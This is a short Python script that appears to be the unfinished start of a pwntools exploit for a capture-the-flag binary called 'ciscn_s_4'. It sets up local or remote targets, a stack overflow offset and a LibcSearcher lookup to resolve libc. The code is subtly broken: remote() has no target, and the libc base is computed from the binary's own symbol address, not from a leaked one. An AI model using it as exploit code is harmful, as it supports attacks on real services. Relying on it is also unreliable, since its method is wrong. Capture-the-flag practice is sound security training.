#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('ciscn_s_4')
	elf = ELF('ciscn_s_4',checksec=False)

else:
	p = remote()
	elf = ELF('ciscn_s_4',checksec=False)

sl = lambda a:p.sendline(a)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()

offset = 44
system = elf.symbols['system']
libc = LibcSearcher('system',system)
libc_base = system - libc.dump('system')


